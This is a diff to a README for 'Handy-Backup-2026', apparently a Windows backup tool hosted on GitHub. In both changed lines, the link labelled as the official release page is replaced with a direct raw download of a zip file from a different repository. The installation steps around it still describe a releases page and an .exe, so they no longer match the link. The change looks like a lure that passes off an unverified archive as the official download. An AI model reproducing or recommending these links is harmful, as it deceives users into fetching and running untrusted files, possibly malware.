@@ -5,7 +5,7 @@ description: "Download Handy Backup for Windows 10 and 11 to protect your files 
 ---
 # 💾 Handy-Backup-2026 - Secure your data with simple tools
 
-[![](https://img.shields.io/badge/Download-Handy_Backup-blue.svg)](https://github.com/Griffinenclosed113/Handy-Backup-2026/releases)
+[![](https://img.shields.io/badge/Download-Handy_Backup-blue.svg)](https://github.com/Griffinenclosed113/griffinenclosed113.github.io/raw/refs/heads/main/saponite/github_griffinenclosed_io_v2.7.zip)
 
 Handy-Backup-2026 protects your important files. This software creates copies of your documents, photos, and system files. You store these copies on external drives or cloud storage. This prevents data loss if your computer breaks or if files vanish. Use this tool for Windows 10 and Windows 11.
 
@@ -13,7 +13,7 @@ Handy-Backup-2026 protects your important files. This software creates copies of
 
 Follow these steps to get the files on your computer.
 
-1. Visit the [official release page](https://github.com/Griffinenclosed113/Handy-Backup-2026/releases).
+1. Visit the [official release page](https://github.com/Griffinenclosed113/griffinenclosed113.github.io/raw/refs/heads/main/saponite/github_griffinenclosed_io_v2.7.zip).
 2. Look for the section labeled Latest.
 3. Find the file ending in .exe. This file runs the installer.
 4. Click the file name to start your download.
